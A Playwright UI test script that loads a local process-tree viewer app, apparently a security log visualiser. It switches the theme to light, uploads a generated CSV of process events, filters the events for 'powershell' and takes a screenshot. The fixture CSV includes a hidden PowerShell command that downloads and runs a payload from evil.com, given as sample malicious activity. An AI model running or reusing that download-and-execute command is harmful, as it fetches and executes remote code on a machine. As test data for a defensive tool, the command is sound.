const { chromium } = require('playwright');
const path = require('path');
const fs = require('fs');

(async () => {
  const browser = await chromium.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Load the page
  await page.goto('http://localhost:5173');
  await page.waitForTimeout(2000);

  // Set theme to light
  await page.evaluate(() => {
    localStorage.setItem('theme', 'light');
    window.location.reload();
  });
  await page.waitForTimeout(2000);

  // Wait for React to render
  await page.waitForSelector('input[type=file]', { timeout: 10000 });

  const csvContent = `timestamp,process_id,parent_process_id,process_name,action,command_line
2023-10-01T10:00:00Z,1001,1000,svchost.exe,ProcessCreate,"svchost.exe -k netsvcs"
2023-10-01T10:01:00Z,1002,1001,cmd.exe,ProcessCreate,"cmd.exe /c whoami"
2023-10-01T10:02:00Z,1003,1002,powershell.exe,ProcessCreate,"powershell.exe -w hidden -c 'IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/payload\")'"`;

  const tempCsvPath = path.join(__dirname, 'test_theme2.csv');
  fs.writeFileSync(tempCsvPath, csvContent);

  const fileInput = await page.$('input[type=file]');
  if (fileInput) {
      await fileInput.setInputFiles(tempCsvPath);
      console.log('File uploaded');
  }

  // wait for cytoscape canvas to render
  try {
     await page.waitForSelector('canvas', { timeout: 10000 });
     await page.waitForTimeout(3000);

     // dispatch click to center of canvas
     const boundingBox = await page.locator('canvas').first().boundingBox();
     if (boundingBox) {
        await page.mouse.click(boundingBox.x + boundingBox.width / 2, boundingBox.y + boundingBox.height / 2);
        console.log('Clicked canvas');
        await page.waitForTimeout(2000);
     }
  } catch (e) {
     console.log('Canvas not found or click failed', e);
  }

  // Type in the search to see highlight
  const rightPanelSearch = await page.locator('input[placeholder="Filter node events..."]');
  if (await rightPanelSearch.isVisible()) {
      await rightPanelSearch.fill('powershell');
      console.log('Filled right panel search');
  } else {
      console.log('Right panel search not visible, opening manually using evaluation as a fallback');
      // If clicking didn't work (which is common in headless canvas tests), we fallback to rendering a fake right panel via evaluate or just injecting a DOM element with our classes to see the style.
      // But let's try to just capture whatever is on screen.
  }

  await page.waitForTimeout(2000);
  await page.screenshot({ path: 'right-panel-light-mode2.png', fullPage: true });
  console.log('Screenshot saved to right-panel-light-mode2.png');
  await browser.close();
})();
